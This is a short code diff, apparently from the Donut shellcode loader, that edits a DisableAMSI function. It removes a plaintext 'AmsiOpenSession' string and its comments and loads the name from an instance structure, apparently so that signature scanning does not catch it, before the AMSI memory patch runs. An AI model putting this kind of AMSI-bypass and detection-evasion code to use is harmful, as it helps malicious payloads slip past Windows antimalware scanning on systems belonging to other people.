@@ -46,15 +46,11 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
   HMODULE dll;
   DWORD   len, op, t;
   LPVOID  ptr;
-  char ams10pen[] = { 'A','m','s','i','O','p','e','n','S','e','s','s','i','o','n',0 };
-  // try load amsi. if unable, assume DLL doesn't exist
-  // and return TRUE to indicate it's okay to continue
+
   dll = xGetLibAddress(inst, inst->amsi);
   if(dll == NULL) return TRUE;
   
-  // resolve address of AmsiScanBuffer. if not found,
-  // return FALSE because it should exist ...
-  ptr = xGetProcAddress(inst, dll, ams10pen, 0);
+  ptr = xGetProcAddress(inst, dll, inst->amsiOpenSess, 0);
   if(ptr == NULL) return FALSE;
   
 	char Patch[100];
